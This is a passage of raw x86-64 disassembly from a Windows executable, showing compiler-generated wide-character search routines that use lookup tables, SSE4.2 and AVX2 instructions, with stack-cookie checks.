   140002d5d:	33 c9                	xor    %ecx,%ecx
   140002d5f:	49 83 fe 08          	cmp    $0x8,%r14
   140002d63:	76 13                	jbe    0x140002d78
   140002d65:	49 83 fe 50          	cmp    $0x50,%r14
   140002d69:	77 06                	ja     0x140002d71
   140002d6b:	48 83 fb 10          	cmp    $0x10,%rbx
   140002d6f:	eb 04                	jmp    0x140002d75
   140002d71:	48 83 fb 08          	cmp    $0x8,%rbx
   140002d75:	0f 97 c1             	seta   %cl
   140002d78:	83 f9 02             	cmp    $0x2,%ecx
   140002d7b:	75 23                	jne    0x140002da0
   140002d7d:	49 8b d6             	mov    %r14,%rdx
   140002d80:	48 8b cf             	mov    %rdi,%rcx
   140002d83:	e8 08 ff ff ff       	call   0x140002c90
   140002d88:	84 c0                	test   %al,%al
   140002d8a:	0f 84 7c 00 00 00    	je     0x140002e0c
   140002d90:	48 8b d3             	mov    %rbx,%rdx
   140002d93:	49 8b cf             	mov    %r15,%rcx
   140002d96:	e8 65 06 00 00       	call   0x140003400
   140002d9b:	e9 e4 00 00 00       	jmp    0x140002e84
   140002da0:	83 f9 01             	cmp    $0x1,%ecx
   140002da3:	75 67                	jne    0x140002e0c
   140002da5:	49 8b d6             	mov    %r14,%rdx
   140002da8:	48 8b cf             	mov    %rdi,%rcx
   140002dab:	e8 e0 fe ff ff       	call   0x140002c90
   140002db0:	84 c0                	test   %al,%al
   140002db2:	74 58                	je     0x140002e0c
   140002db4:	be 00 01 00 00       	mov    $0x100,%esi
   140002db9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002dbd:	44 8b c6             	mov    %esi,%r8d
   140002dc0:	33 d2                	xor    %edx,%edx
   140002dc2:	e8 39 d4 00 00       	call   0x140010200
   140002dc7:	4a 8d 0c 77          	lea    (%rdi,%r14,2),%rcx
   140002dcb:	48 3b f9             	cmp    %rcx,%rdi
   140002dce:	74 11                	je     0x140002de1
   140002dd0:	0f b7 07             	movzwl (%rdi),%eax
   140002dd3:	48 83 c7 02          	add    $0x2,%rdi
   140002dd7:	c6 44 05 00 01       	movb   $0x1,0x0(%rbp,%rax,1)
   140002ddc:	48 3b f9             	cmp    %rcx,%rdi
   140002ddf:	75 ef                	jne    0x140002dd0
   140002de1:	48 85 db             	test   %rbx,%rbx
   140002de4:	0f 84 90 00 00 00    	je     0x140002e7a
   140002dea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002df0:	41 0f b7 44 5f fe    	movzwl -0x2(%r15,%rbx,2),%eax
   140002df6:	48 ff cb             	dec    %rbx
   140002df9:	66 3b c6             	cmp    %si,%ax
   140002dfc:	73 07                	jae    0x140002e05
   140002dfe:	80 7c 05 00 00       	cmpb   $0x0,0x0(%rbp,%rax,1)
   140002e03:	75 7c                	jne    0x140002e81
   140002e05:	48 85 db             	test   %rbx,%rbx
   140002e08:	75 e6                	jne    0x140002df0
   140002e0a:	eb 6e                	jmp    0x140002e7a
   140002e0c:	48 8b d3             	mov    %rbx,%rdx
   140002e0f:	49 8b cf             	mov    %r15,%rcx
   140002e12:	e8 89 02 00 00       	call   0x1400030a0
   140002e17:	eb 6b                	jmp    0x140002e84
   140002e19:	be 00 01 00 00       	mov    $0x100,%esi
   140002e1e:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002e22:	44 8b c6             	mov    %esi,%r8d
   140002e25:	33 d2                	xor    %edx,%edx
   140002e27:	e8 d4 d3 00 00       	call   0x140010200
   140002e2c:	4a 8d 14 77          	lea    (%rdi,%r14,2),%rdx
   140002e30:	48 8b cf             	mov    %rdi,%rcx
   140002e33:	48 3b fa             	cmp    %rdx,%rdi
   140002e36:	74 16                	je     0x140002e4e
   140002e38:	0f b7 01             	movzwl (%rcx),%eax
   140002e3b:	66 3b c6             	cmp    %si,%ax
   140002e3e:	73 63                	jae    0x140002ea3
   140002e40:	48 83 c1 02          	add    $0x2,%rcx
   140002e44:	c6 44 05 00 01       	movb   $0x1,0x0(%rbp,%rax,1)
   140002e49:	48 3b ca             	cmp    %rdx,%rcx
   140002e4c:	75 ea                	jne    0x140002e38
   140002e4e:	48 85 db             	test   %rbx,%rbx
   140002e51:	74 27                	je     0x140002e7a
   140002e53:	0f 1f 40 00          	nopl   0x0(%rax)
   140002e57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002e5e:	00 00 
   140002e60:	41 0f b7 44 5f fe    	movzwl -0x2(%r15,%rbx,2),%eax
   140002e66:	48 ff cb             	dec    %rbx
   140002e69:	66 3b c6             	cmp    %si,%ax
   140002e6c:	73 07                	jae    0x140002e75
   140002e6e:	80 7c 05 00 00       	cmpb   $0x0,0x0(%rbp,%rax,1)
   140002e73:	75 0c                	jne    0x140002e81
   140002e75:	48 85 db             	test   %rbx,%rbx
   140002e78:	75 e6                	jne    0x140002e60
   140002e7a:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140002e81:	48 8b c3             	mov    %rbx,%rax
   140002e84:	48 8b 8d 00 01 00 00 	mov    0x100(%rbp),%rcx
   140002e8b:	48 33 cc             	xor    %rsp,%rcx
   140002e8e:	e8 ed 0b 00 00       	call   0x140003a80
   140002e93:	48 81 c4 58 01 00 00 	add    $0x158,%rsp
   140002e9a:	41 5f                	pop    %r15
   140002e9c:	41 5e                	pop    %r14
   140002e9e:	5f                   	pop    %rdi
   140002e9f:	5e                   	pop    %rsi
   140002ea0:	5b                   	pop    %rbx
   140002ea1:	5d                   	pop    %rbp
   140002ea2:	c3                   	ret
   140002ea3:	48 85 db             	test   %rbx,%rbx
   140002ea6:	74 d2                	je     0x140002e7a
   140002ea8:	41 0f b7 4c 5f fe    	movzwl -0x2(%r15,%rbx,2),%ecx
   140002eae:	48 ff cb             	dec    %rbx
   140002eb1:	48 8b c7             	mov    %rdi,%rax
   140002eb4:	66 3b 08             	cmp    (%rax),%cx
   140002eb7:	74 c8                	je     0x140002e81
   140002eb9:	48 83 c0 02          	add    $0x2,%rax
   140002ebd:	48 3b c2             	cmp    %rdx,%rax
   140002ec0:	75 f2                	jne    0x140002eb4
   140002ec2:	eb df                	jmp    0x140002ea3
   140002ec4:	cc                   	int3
   140002ec5:	cc                   	int3
   140002ec6:	cc                   	int3
   140002ec7:	cc                   	int3
   140002ec8:	cc                   	int3
   140002ec9:	cc                   	int3
   140002eca:	cc                   	int3
   140002ecb:	cc                   	int3
   140002ecc:	cc                   	int3
   140002ecd:	cc                   	int3
   140002ece:	cc                   	int3
   140002ecf:	cc                   	int3
   140002ed0:	40 55                	rex push %rbp
   140002ed2:	53                   	push   %rbx
   140002ed3:	56                   	push   %rsi
   140002ed4:	57                   	push   %rdi
   140002ed5:	41 54                	push   %r12
   140002ed7:	41 56                	push   %r14
   140002ed9:	41 57                	push   %r15
   140002edb:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140002ee2:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002ee7:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   140002eeb:	48 8b 05 0e b1 01 00 	mov    0x1b10e(%rip),%rax        # 0x14001e000
   140002ef2:	48 33 c4             	xor    %rsp,%rax
   140002ef5:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   140002efc:	f6 05 51 b1 01 00 20 	testb  $0x20,0x1b151(%rip)        # 0x14001e054
   140002f03:	4d 8b f1             	mov    %r9,%r14
   140002f06:	49 8b f8             	mov    %r8,%rdi
   140002f09:	48 8b f2             	mov    %rdx,%rsi
   140002f0c:	4c 8b f9             	mov    %rcx,%r15
   140002f0f:	74 27                	je     0x140002f38
   140002f11:	48 83 fa 30          	cmp    $0x30,%rdx
   140002f15:	76 21                	jbe    0x140002f38
   140002f17:	33 db                	xor    %ebx,%ebx
   140002f19:	49 83 f9 08          	cmp    $0x8,%r9
   140002f1d:	77 10                	ja     0x140002f2f
   140002f1f:	48 81 fa 80 00 00 00 	cmp    $0x80,%rdx
   140002f26:	8b cb                	mov    %ebx,%ecx
   140002f28:	0f 97 c1             	seta   %cl
   140002f2b:	03 c9                	add    %ecx,%ecx
   140002f2d:	eb 26                	jmp    0x140002f55
   140002f2f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002f34:	03 c9                	add    %ecx,%ecx
   140002f36:	eb 1d                	jmp    0x140002f55
   140002f38:	33 db                	xor    %ebx,%ebx
   140002f3a:	8b cb                	mov    %ebx,%ecx
   140002f3c:	49 83 fe 08          	cmp    $0x8,%r14
   140002f40:	76 13                	jbe    0x140002f55
   140002f42:	49 83 fe 50          	cmp    $0x50,%r14
   140002f46:	77 06                	ja     0x140002f4e
   140002f48:	48 83 fe 10          	cmp    $0x10,%rsi
   140002f4c:	eb 04                	jmp    0x140002f52
   140002f4e:	48 83 fe 08          	cmp    $0x8,%rsi
   140002f52:	0f 97 c1             	seta   %cl
   140002f55:	83 f9 02             	cmp    $0x2,%ecx
   140002f58:	75 73                	jne    0x140002fcd
   140002f5a:	66 0f 6f 0d 2e 0a 01 	movdqa 0x10a2e(%rip),%xmm1        # 0x140013990
   140002f61:	00 
   140002f62:	4b 8d 0c 09          	lea    (%r9,%r9,1),%rcx
   140002f66:	4c 8b c1             	mov    %rcx,%r8
   140002f69:	48 8b c7             	mov    %rdi,%rax
   140002f6c:	49 83 e0 f0          	and    $0xfffffffffffffff0,%r8
   140002f70:	4c 03 c7             	add    %rdi,%r8
   140002f73:	49 3b f8             	cmp    %r8,%rdi
   140002f76:	74 20                	je     0x140002f98
   140002f78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002f7f:	00 
   140002f80:	f3 0f 6f 00          	movdqu (%rax),%xmm0
   140002f84:	66 0f 38 17 c8       	ptest  %xmm0,%xmm1
   140002f89:	0f 85 b4 00 00 00    	jne    0x140003043
   140002f8f:	48 83 c0 10          	add    $0x10,%rax
   140002f93:	49 3b c0             	cmp    %r8,%rax
   140002f96:	75 e8                	jne    0x140002f80
   140002f98:	83 e1 0f             	and    $0xf,%ecx
   140002f9b:	4c 03 c1             	add    %rcx,%r8
   140002f9e:	49 3b c0             	cmp    %r8,%rax
   140002fa1:	74 1a                	je     0x140002fbd
   140002fa3:	44 0f b7 10          	movzwl (%rax),%r10d
   140002fa7:	41 f7 c2 00 ff ff ff 	test   $0xffffff00,%r10d
   140002fae:	0f 85 8f 00 00 00    	jne    0x140003043
   140002fb4:	48 83 c0 02          	add    $0x2,%rax
   140002fb8:	49 3b c0             	cmp    %r8,%rax
   140002fbb:	75 e6                	jne    0x140002fa3
   140002fbd:	4c 8b c7             	mov    %rdi,%r8
   140002fc0:	49 8b cf             	mov    %r15,%rcx
   140002fc3:	e8 f8 02 00 00       	call   0x1400032c0
   140002fc8:	e9 a9 00 00 00       	jmp    0x140003076
   140002fcd:	83 f9 01             	cmp    $0x1,%ecx
   140002fd0:	75 71                	jne    0x140003043
   140002fd2:	49 8b d6             	mov    %r14,%rdx
   140002fd5:	48 8b cf             	mov    %rdi,%rcx
   140002fd8:	e8 b3 fc ff ff       	call   0x140002c90
   140002fdd:	84 c0                	test   %al,%al
   140002fdf:	74 62                	je     0x140003043
   140002fe1:	41 bc 00 01 00 00    	mov    $0x100,%r12d
   140002fe7:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002feb:	45 8b c4             	mov    %r12d,%r8d
   140002fee:	33 d2                	xor    %edx,%edx
   140002ff0:	e8 0b d2 00 00       	call   0x140010200
   140002ff5:	4a 8d 0c 77          	lea    (%rdi,%r14,2),%rcx
   140002ff9:	48 3b f9             	cmp    %rcx,%rdi
   140002ffc:	74 13                	je     0x140003011
   140002ffe:	66 90                	xchg   %ax,%ax
   140003000:	0f b7 07             	movzwl (%rdi),%eax
   140003003:	48 83 c7 02          	add    $0x2,%rdi
   140003007:	c6 44 05 00 01       	movb   $0x1,0x0(%rbp,%rax,1)
   14000300c:	48 3b f9             	cmp    %rcx,%rdi
   14000300f:	75 ef                	jne    0x140003000
   140003011:	48 85 f6             	test   %rsi,%rsi
   140003014:	74 24                	je     0x14000303a
   140003016:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000301d:	00 00 00 
   140003020:	41 0f b7 04 5f       	movzwl (%r15,%rbx,2),%eax
   140003025:	66 41 3b c4          	cmp    %r12w,%ax
   140003029:	73 07                	jae    0x140003032
   14000302b:	80 7c 05 00 00       	cmpb   $0x0,0x0(%rbp,%rax,1)
   140003030:	75 41                	jne    0x140003073
   140003032:	48 ff c3             	inc    %rbx
   140003035:	48 3b de             	cmp    %rsi,%rbx
   140003038:	75 e6                	jne    0x140003020
   14000303a:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140003041:	eb 30                	jmp    0x140003073
   140003043:	48 8d 1c 36          	lea    (%rsi,%rsi,1),%rbx
   140003047:	4d 03 c9             	add    %r9,%r9
   14000304a:	48 8b d3             	mov    %rbx,%rdx
   14000304d:	4c 8b c7             	mov    %rdi,%r8
   140003050:	49 8b cf             	mov    %r15,%rcx
   140003053:	e8 e8 04 00 00       	call   0x140003540
   140003058:	4a 8d 0c 3b          	lea    (%rbx,%r15,1),%rcx
   14000305c:	48 8b d0             	mov    %rax,%rdx
   14000305f:	49 2b d7             	sub    %r15,%rdx
   140003062:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140003069:	48 d1 ea             	shr    $1,%rdx
   14000306c:	48 3b c1             	cmp    %rcx,%rax
   14000306f:	48 0f 45 da          	cmovne %rdx,%rbx
   140003073:	48 8b c3             	mov    %rbx,%rax
   140003076:	48 8b 8d 00 01 00 00 	mov    0x100(%rbp),%rcx
   14000307d:	48 33 cc             	xor    %rsp,%rcx
   140003080:	e8 fb 09 00 00       	call   0x140003a80
   140003085:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   14000308c:	41 5f                	pop    %r15
   14000308e:	41 5e                	pop    %r14
   140003090:	41 5c                	pop    %r12
   140003092:	5f                   	pop    %rdi
   140003093:	5e                   	pop    %rsi
   140003094:	5b                   	pop    %rbx
   140003095:	5d                   	pop    %rbp
   140003096:	c3                   	ret
   140003097:	cc                   	int3
   140003098:	cc                   	int3
   140003099:	cc                   	int3
   14000309a:	cc                   	int3
   14000309b:	cc                   	int3
   14000309c:	cc                   	int3
   14000309d:	cc                   	int3
   14000309e:	cc                   	int3
   14000309f:	cc                   	int3
   1400030a0:	40 53                	rex push %rbx
   1400030a2:	55                   	push   %rbp
   1400030a3:	56                   	push   %rsi
   1400030a4:	57                   	push   %rdi
   1400030a5:	41 54                	push   %r12
   1400030a7:	41 55                	push   %r13
   1400030a9:	41 56                	push   %r14
   1400030ab:	41 57                	push   %r15
   1400030ad:	48 83 ec 68          	sub    $0x68,%rsp
   1400030b1:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   1400030b6:	48 8b 05 43 af 01 00 	mov    0x1af43(%rip),%rax        # 0x14001e000
   1400030bd:	48 33 c4             	xor    %rsp,%rax
   1400030c0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400030c5:	48 8d 2c 12          	lea    (%rdx,%rdx,1),%rbp
   1400030c9:	49 8b d9             	mov    %r9,%rbx
   1400030cc:	4c 8b f5             	mov    %rbp,%r14
   1400030cf:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400030d4:	41 83 e6 0f          	and    $0xf,%r14d
   1400030d8:	4f 8d 3c 09          	lea    (%r9,%r9,1),%r15
   1400030dc:	48 8d 3c 29          	lea    (%rcx,%rbp,1),%rdi
   1400030e0:	49 8b f0             	mov    %r8,%rsi
   1400030e3:	4c 8b e9             	mov    %rcx,%r13
   1400030e6:	4d 8d 24 0e          	lea    (%r14,%rcx,1),%r12
   1400030ea:	49 83 ff 10          	cmp    $0x10,%r15
   1400030ee:	0f 87 97 00 00 00    	ja     0x14000318b
   1400030f4:	4d 8b c7             	mov    %r15,%r8
   1400030f7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400030fc:	48 8b d6             	mov    %rsi,%rdx
   1400030ff:	e8 5c ca 00 00       	call   0x14000fb60
   140003104:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000310a:	49 3b fc             	cmp    %r12,%rdi
   14000310d:	74 1e                	je     0x14000312d
   14000310f:	90                   	nop
   140003110:	f3 0f 6f 47 f0       	movdqu -0x10(%rdi),%xmm0
   140003115:	48 83 ef 10          	sub    $0x10,%rdi
   140003119:	8b c3                	mov    %ebx,%eax
   14000311b:	ba 08 00 00 00       	mov    $0x8,%edx
   140003120:	66 0f 3a 61 f0 41    	pcmpestri $0x41,%xmm0,%xmm6
   140003126:	72 1b                	jb     0x140003143
   140003128:	49 3b fc             	cmp    %r12,%rdi
   14000312b:	75 e3                	jne    0x140003110
   14000312d:	4d 85 f6             	test   %r14,%r14
   140003130:	74 4d                	je     0x14000317f
   140003132:	49 d1 ee             	shr    $1,%r14
   140003135:	48 83 fd 10          	cmp    $0x10,%rbp
   140003139:	72 19                	jb     0x140003154
   14000313b:	f3 41 0f 6f 45 00    	movdqu 0x0(%r13),%xmm0
   140003141:	eb 27                	jmp    0x14000316a
   140003143:	49 2b fd             	sub    %r13,%rdi
   140003146:	48 63 c1             	movslq %ecx,%rax
   140003149:	48 d1 ef             	shr    $1,%rdi
   14000314c:	48 03 c7             	add    %rdi,%rax
   14000314f:	e9 3b 01 00 00       	jmp    0x14000328f
   140003154:	4c 8b c5             	mov    %rbp,%r8
   140003157:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000315c:	49 8b d5             	mov    %r13,%rdx
   14000315f:	e8 fc c9 00 00       	call   0x14000fb60
   140003164:	66 0f 6f 44 24 20    	movdqa 0x20(%rsp),%xmm0
   14000316a:	8b c3                	mov    %ebx,%eax
   14000316c:	41 8b d6             	mov    %r14d,%edx
   14000316f:	66 0f 3a 61 f0 41    	pcmpestri $0x41,%xmm0,%xmm6
   140003175:	73 08                	jae    0x14000317f
   140003177:	48 63 c1             	movslq %ecx,%rax
   14000317a:	e9 10 01 00 00       	jmp    0x14000328f
   14000317f:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003186:	e9 04 01 00 00       	jmp    0x14000328f
   14000318b:	49 8b ef             	mov    %r15,%rbp
   14000318e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003193:	48 83 e5 f0          	and    $0xfffffffffffffff0,%rbp
   140003197:	41 83 e7 0f          	and    $0xf,%r15d
   14000319b:	48 03 ee             	add    %rsi,%rbp
   14000319e:	45 8b c7             	mov    %r15d,%r8d
   1400031a1:	48 8b d5             	mov    %rbp,%rdx
   1400031a4:	e8 b7 c9 00 00       	call   0x14000fb60
   1400031a9:	66 0f 6f 74 24 30    	movdqa 0x30(%rsp),%xmm6
   1400031af:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   1400031b6:	49 d1 ef             	shr    $1,%r15
   1400031b9:	49 3b fc             	cmp    %r12,%rdi
   1400031bc:	74 58                	je     0x140003216
   1400031be:	66 90                	xchg   %ax,%ax
   1400031c0:	f3 0f 6f 4f f0       	movdqu -0x10(%rdi),%xmm1
   1400031c5:	48 83 ef 10          	sub    $0x10,%rdi
   1400031c9:	4c 8b c6             	mov    %rsi,%r8
   1400031cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400031d0:	f3 41 0f 6f 00       	movdqu (%r8),%xmm0
   1400031d5:	b8 08 00 00 00       	mov    $0x8,%eax
   1400031da:	8b d0                	mov    %eax,%edx
   1400031dc:	66 0f 3a 61 c1 41    	pcmpestri $0x41,%xmm1,%xmm0
   1400031e2:	73 05                	jae    0x1400031e9
   1400031e4:	3b cb                	cmp    %ebx,%ecx
   1400031e6:	0f 4f d9             	cmovg  %ecx,%ebx
   1400031e9:	49 83 c0 10          	add    $0x10,%r8
   1400031ed:	4c 3b c5             	cmp    %rbp,%r8
   1400031f0:	75 de                	jne    0x1400031d0
   1400031f2:	45 85 ff             	test   %r15d,%r15d
   1400031f5:	74 15                	je     0x14000320c
   1400031f7:	41 8b c7             	mov    %r15d,%eax
   1400031fa:	ba 08 00 00 00       	mov    $0x8,%edx
   1400031ff:	66 0f 3a 61 f1 41    	pcmpestri $0x41,%xmm1,%xmm6
   140003205:	73 05                	jae    0x14000320c
   140003207:	3b cb                	cmp    %ebx,%ecx
   140003209:	0f 4f d9             	cmovg  %ecx,%ebx
   14000320c:	83 fb ff             	cmp    $0xffffffff,%ebx
   14000320f:	75 20                	jne    0x140003231
   140003211:	49 3b fc             	cmp    %r12,%rdi
   140003214:	75 aa                	jne    0x1400031c0
   140003216:	4d 85 f6             	test   %r14,%r14
   140003219:	74 71                	je     0x14000328c
   14000321b:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140003220:	49 d1 ee             	shr    $1,%r14
   140003223:	49 83 f8 10          	cmp    $0x10,%r8
   140003227:	72 16                	jb     0x14000323f
   140003229:	f3 41 0f 6f 4d 00    	movdqu 0x0(%r13),%xmm1
   14000322f:	eb 21                	jmp    0x140003252
   140003231:	49 2b fd             	sub    %r13,%rdi
   140003234:	48 63 c3             	movslq %ebx,%rax
   140003237:	48 d1 ef             	shr    $1,%rdi
   14000323a:	48 03 c7             	add    %rdi,%rax
   14000323d:	eb 50                	jmp    0x14000328f
   14000323f:	49 8b d5             	mov    %r13,%rdx
   140003242:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003247:	e8 14 c9 00 00       	call   0x14000fb60
   14000324c:	66 0f 6f 4c 24 30    	movdqa 0x30(%rsp),%xmm1
   140003252:	f3 0f 6f 06          	movdqu (%rsi),%xmm0
   140003256:	b8 08 00 00 00       	mov    $0x8,%eax
   14000325b:	41 8b d6             	mov    %r14d,%edx
   14000325e:	66 0f 3a 61 c1 41    	pcmpestri $0x41,%xmm1,%xmm0
   140003264:	73 05                	jae    0x14000326b
   140003266:	3b cb                	cmp    %ebx,%ecx
   140003268:	0f 4f d9             	cmovg  %ecx,%ebx
   14000326b:	48 83 c6 10          	add    $0x10,%rsi
   14000326f:	48 3b f5             	cmp    %rbp,%rsi
   140003272:	75 de                	jne    0x140003252
   140003274:	45 85 ff             	test   %r15d,%r15d
   140003277:	74 13                	je     0x14000328c
   140003279:	41 8b c7             	mov    %r15d,%eax
   14000327c:	41 8b d6             	mov    %r14d,%edx
   14000327f:	66 0f 3a 61 f1 41    	pcmpestri $0x41,%xmm1,%xmm6
   140003285:	73 05                	jae    0x14000328c
   140003287:	3b cb                	cmp    %ebx,%ecx
   140003289:	0f 4f d9             	cmovg  %ecx,%ebx
   14000328c:	48 63 c3             	movslq %ebx,%rax
   14000328f:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003294:	48 33 cc             	xor    %rsp,%rcx
   140003297:	e8 e4 07 00 00       	call   0x140003a80
   14000329c:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   1400032a1:	48 83 c4 68          	add    $0x68,%rsp
   1400032a5:	41 5f                	pop    %r15
   1400032a7:	41 5e                	pop    %r14
   1400032a9:	41 5d                	pop    %r13
   1400032ab:	41 5c                	pop    %r12
   1400032ad:	5f                   	pop    %rdi
   1400032ae:	5e                   	pop    %rsi
   1400032af:	5d                   	pop    %rbp
   1400032b0:	5b                   	pop    %rbx
   1400032b1:	c3                   	ret
   1400032b2:	cc                   	int3
   1400032b3:	cc                   	int3
   1400032b4:	cc                   	int3
   1400032b5:	cc                   	int3
   1400032b6:	cc                   	int3
   1400032b7:	cc                   	int3
   1400032b8:	cc                   	int3
   1400032b9:	cc                   	int3
   1400032ba:	cc                   	int3
   1400032bb:	cc                   	int3
   1400032bc:	cc                   	int3
   1400032bd:	cc                   	int3
   1400032be:	cc                   	int3
   1400032bf:	cc                   	int3
   1400032c0:	48 8b c4             	mov    %rsp,%rax
   1400032c3:	55                   	push   %rbp
   1400032c4:	53                   	push   %rbx
   1400032c5:	56                   	push   %rsi
   1400032c6:	57                   	push   %rdi
   1400032c7:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   1400032ce:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   1400032d2:	0f 29 78 b8          	movaps %xmm7,-0x48(%rax)
   1400032d6:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   1400032db:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   1400032df:	48 8b fa             	mov    %rdx,%rdi
   1400032e2:	48 8b f1             	mov    %rcx,%rsi
   1400032e5:	49 8b d1             	mov    %r9,%rdx
   1400032e8:	49 8b c8             	mov    %r8,%rcx
   1400032eb:	e8 40 04 00 00       	call   0x140003730
   1400032f0:	48 8b df             	mov    %rdi,%rbx
   1400032f3:	b8 00 00 00 00       	mov    $0x0,%eax
   1400032f8:	c5 fe 6f d0          	vmovdqu %ymm0,%ymm2
   1400032fc:	c5 fe 7f 45 20       	vmovdqu %ymm0,0x20(%rbp)
   140003301:	48 83 e3 f8          	and    $0xfffffffffffffff8,%rbx
   140003305:	74 54                	je     0x14000335b
   140003307:	c5 fe 6f 35 d1 06 01 	vmovdqu 0x106d1(%rip),%ymm6        # 0x1400139e0
   14000330e:	00 
   14000330f:	c5 fe 6f 3d a9 06 01 	vmovdqu 0x106a9(%rip),%ymm7        # 0x1400139c0
   140003316:	00 
   140003317:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000331b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003320:	c4 e2 7d 33 24 46    	vpmovzxwd (%rsi,%rax,2),%ymm4
   140003326:	c5 dd db c6          	vpand  %ymm6,%ymm4,%ymm0
   14000332a:	c5 f5 72 d4 05       	vpsrld $0x5,%ymm4,%ymm1
   14000332f:	c5 fd 76 dd          	vpcmpeqd %ymm5,%ymm0,%ymm3
   140003333:	c4 e2 75 36 d2       	vpermd %ymm2,%ymm1,%ymm2
   140003338:	c5 dd df c7          	vpandn %ymm7,%ymm4,%ymm0
   14000333c:	c4 e2 6d 47 d0       	vpsllvd %ymm0,%ymm2,%ymm2
   140003341:	c5 ed db cb          	vpand  %ymm3,%ymm2,%ymm1
   140003345:	c5 fc 50 c9          	vmovmskps %ymm1,%ecx
   140003349:	85 c9                	test   %ecx,%ecx
   14000334b:	75 7b                	jne    0x1400033c8
   14000334d:	c5 fe 6f 55 20       	vmovdqu 0x20(%rbp),%ymm2
   140003352:	48 83 c0 08          	add    $0x8,%rax
   140003356:	48 3b c3             	cmp    %rbx,%rax
   140003359:	75 c5                	jne    0x140003320
   14000335b:	83 e7 07             	and    $0x7,%edi
   14000335e:	74 76                	je     0x1400033d6
   140003360:	4c 8d 04 3f          	lea    (%rdi,%rdi,1),%r8
   140003364:	48 8d 14 5e          	lea    (%rsi,%rbx,2),%rdx
   140003368:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000336c:	c5 f8 77             	vzeroupper
   14000336f:	e8 ec c7 00 00       	call   0x14000fb60
   140003374:	c4 e2 7d 33 6d 00    	vpmovzxwd 0x0(%rbp),%ymm5
   14000337a:	c5 fe 6f 05 5e 06 01 	vmovdqu 0x1065e(%rip),%ymm0        # 0x1400139e0
   140003381:	00 
   140003382:	c5 fd db cd          	vpand  %ymm5,%ymm0,%ymm1
   140003386:	c5 d5 df 05 32 06 01 	vpandn 0x10632(%rip),%ymm5,%ymm0        # 0x1400139c0
   14000338d:	00 
   14000338e:	c5 e9 ef d2          	vpxor  %xmm2,%xmm2,%xmm2
   140003392:	c5 f5 76 e2          	vpcmpeqd %ymm2,%ymm1,%ymm4
   140003396:	c5 ed 72 d5 05       	vpsrld $0x5,%ymm5,%ymm2
   14000339b:	c4 e2 6d 36 5d 20    	vpermd 0x20(%rbp),%ymm2,%ymm3
   1400033a1:	c4 e2 65 47 c8       	vpsllvd %ymm0,%ymm3,%ymm1
   1400033a6:	8b cf                	mov    %edi,%ecx
   1400033a8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400033ad:	d3 e0                	shl    %cl,%eax
   1400033af:	c5 f5 db d4          	vpand  %ymm4,%ymm1,%ymm2
   1400033b3:	c5 fc 50 d2          	vmovmskps %ymm2,%edx
   1400033b7:	ff c8                	dec    %eax
   1400033b9:	23 d0                	and    %eax,%edx
   1400033bb:	74 19                	je     0x1400033d6
   1400033bd:	f3 0f bc c2          	tzcnt  %edx,%eax
   1400033c1:	8b c0                	mov    %eax,%eax
   1400033c3:	48 03 c3             	add    %rbx,%rax
   1400033c6:	eb 15                	jmp    0x1400033dd
   1400033c8:	c5 f8 77             	vzeroupper
   1400033cb:	f3 0f bc d1          	tzcnt  %ecx,%edx
   1400033cf:	8b d2                	mov    %edx,%edx
   1400033d1:	48 03 c2             	add    %rdx,%rax
   1400033d4:	eb 0a                	jmp    0x1400033e0
   1400033d6:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400033dd:	c5 f8 77             	vzeroupper
   1400033e0:	0f 28 b4 24 90 00 00 	movaps 0x90(%rsp),%xmm6
   1400033e7:	00 
   1400033e8:	0f 28 bc 24 80 00 00 	movaps 0x80(%rsp),%xmm7
   1400033ef:	00 
   1400033f0:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   1400033f7:	5f                   	pop    %rdi
   1400033f8:	5e                   	pop    %rsi
   1400033f9:	5b                   	pop    %rbx
   1400033fa:	5d                   	pop    %rbp
   1400033fb:	c3                   	ret
   1400033fc:	cc                   	int3
   1400033fd:	cc                   	int3
   1400033fe:	cc                   	int3
   1400033ff:	cc                   	int3
   140003400:	48 8b c4             	mov    %rsp,%rax
   140003403:	55                   	push   %rbp
   140003404:	53                   	push   %rbx
   140003405:	57                   	push   %rdi
